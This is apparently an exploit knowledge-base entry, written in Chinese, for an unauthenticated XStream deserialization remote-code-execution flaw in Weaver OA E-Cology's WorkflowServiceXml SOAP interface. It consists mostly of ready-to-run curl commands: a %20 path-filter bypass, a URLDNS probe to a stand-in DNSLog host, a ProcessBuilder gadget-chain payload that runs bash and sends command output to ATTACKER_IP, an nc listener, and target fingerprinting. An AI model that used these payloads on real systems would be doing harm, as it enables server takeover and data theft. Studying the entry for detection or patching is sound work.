---
id: WEAVER-WORKFLOWSERVICE-RCE
title: 泛微OA E-Cology WorkflowServiceXml XStream反序列化RCE
product: weaver-oa
vendor: 泛微网络
version_affected: "E-Cology <= 9.0"
severity: CRITICAL
tags: [rce, deserialization, 无需认证, 国产, oa]
fingerprint: ["泛微", "weaver", "ecology", "E-cology"]
---

## 漏洞描述

泛微OA E-Cology 的 WorkflowServiceXml SOAP 接口存在 XStream 反序列化漏洞。攻击者通过 URL 编码空格（`%20`）绕过安全过滤，访问 `/services%20/WorkflowServiceXml` 接口，在 SOAP 请求中注入 XStream 反序列化 payload，无需认证即可实现远程代码执行。

## 影响版本

- 泛微OA E-Cology <= 9.0

## 前置条件

- 无需认证
- 目标运行泛微OA E-Cology
- `/services%20/WorkflowServiceXml` 接口可达

## 利用步骤

1. 通过 `%20` 绕过路径过滤访问 WorkflowServiceXml 接口
2. 构造 SOAP 请求，在 `<web:string>` 中嵌入 XStream 反序列化 payload
3. 通过 URLDNS 或 HTTP 回调确认反序列化触发
4. 使用可回显的 gadget chain 执行系统命令

## Payload

**URLDNS 探测（确认反序列化漏洞）**

```bash
curl -s "http://target/services%20/WorkflowServiceXml" \
  -X POST \
  -H "Content-Type: text/xml;charset=UTF-8" \
  -H "SOAPAction: \"\"" \
  -d '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="webservices.services.weaver.com.cn">
   <soapenv:Header/>
   <soapenv:Body>
      <web:doCreateWorkflowRequest>
        <web:string>&lt;map&gt;&lt;entry&gt;&lt;url&gt;http://ATTACKER_DNSLOG&lt;/url&gt;&lt;string&gt;http://ATTACKER_DNSLOG&lt;/string&gt;&lt;/entry&gt;&lt;/map&gt;</web:string>
        <web:string>2</web:string>
      </web:doCreateWorkflowRequest>
   </soapenv:Body>
</soapenv:Envelope>'
```

**命令执行（使用 Cmd header 回显）**

```bash
curl -s "http://target/services%20/WorkflowServiceXml" \
  -X POST \
  -H "Content-Type: text/xml;charset=UTF-8" \
  -H "SOAPAction: \"\"" \
  -H "Cmd: id" \
  -d '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="webservices.services.weaver.com.cn">
   <soapenv:Header/>
   <soapenv:Body>
      <web:doCreateWorkflowRequest>
        <web:string>&lt;sorted-set&gt;&lt;string&gt;foo&lt;/string&gt;&lt;dynamic-proxy&gt;&lt;interface&gt;java.lang.Comparable&lt;/interface&gt;&lt;handler class=&quot;java.beans.EventHandler&quot;&gt;&lt;target class=&quot;java.lang.ProcessBuilder&quot;&gt;&lt;command&gt;&lt;string&gt;/bin/bash&lt;/string&gt;&lt;string&gt;-c&lt;/string&gt;&lt;string&gt;curl http://ATTACKER_IP:8888/$(id|base64)&lt;/string&gt;&lt;/command&gt;&lt;/target&gt;&lt;action&gt;start&lt;/action&gt;&lt;/handler&gt;&lt;/dynamic-proxy&gt;&lt;/sorted-set&gt;</web:string>
        <web:string>2</web:string>
      </web:doCreateWorkflowRequest>
   </soapenv:Body>
</soapenv:Envelope>'
```

## 验证方法

```bash
# 方法一：URLDNS 探测 — 检查 DNSLog 是否收到请求
curl -s "http://target/services%20/WorkflowServiceXml" \
  -X POST -H "Content-Type: text/xml;charset=UTF-8" -H "SOAPAction: \"\"" \
  -d '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="webservices.services.weaver.com.cn"><soapenv:Header/><soapenv:Body><web:doCreateWorkflowRequest><web:string>&lt;map&gt;&lt;entry&gt;&lt;url&gt;http://ATTACKER_DNSLOG&lt;/url&gt;&lt;string&gt;test&lt;/string&gt;&lt;/entry&gt;&lt;/map&gt;</web:string><web:string>2</web:string></web:doCreateWorkflowRequest></soapenv:Body></soapenv:Envelope>'

# 方法二：HTTP 回调确认 RCE
# 攻击机监听: nc -lvp 8888
# 发送带 curl 回调的 payload（见上方命令执行 payload）
```

## 指纹确认

```bash
# 确认泛微OA
curl -s "http://target/login/Login.jsp" | grep -i "ecology\|泛微\|weaver"

# 确认 SOAP 接口存在（使用 %20 绕过）
curl -s "http://target/services%20/WorkflowServiceXml" -o /dev/null -w "%{http_code}"
# 返回 200 或包含 SOAP 响应则接口存在
```

## 参考链接

- https://www.anquanke.com/post/id/239865
- https://github.com/PeiQi0/PeiQi-WIKI-Book
